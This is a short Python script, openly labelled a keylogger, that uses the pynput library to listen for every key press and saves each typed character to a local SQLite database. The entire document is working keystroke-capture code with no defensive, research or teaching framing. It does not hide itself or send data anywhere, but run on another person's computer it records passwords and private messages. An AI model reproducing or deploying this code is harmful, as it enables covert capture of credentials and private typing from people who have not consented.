import sqlite3
from pynput import keyboard

# Initialize the database
def init_db():
    conn = sqlite3.connect("keystrokes.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            keystroke TEXT
        )
    """)
    conn.commit()
    conn.close()

# Insert a keystroke into the database
def insert_keystroke(keystroke):
    conn = sqlite3.connect("keystrokes.db")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO keystrokes (keystroke) VALUES (?)", (keystroke,))
    conn.commit()
    conn.close()

def key_pressed(key):
    try:
        char = key.char
        insert_keystroke(char)
        print(f"{char} written to database.")
    except AttributeError:
        print("Error getting char: {0}".format(key))
    except Exception as e:
        print("Unexpected error:", str(e))

if __name__ == "__main__":
    init_db()
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    print("Press Ctrl+C to stop the keylogger.")
    try:
        input()
    except KeyboardInterrupt:
        print("\nStopping the keylogger.")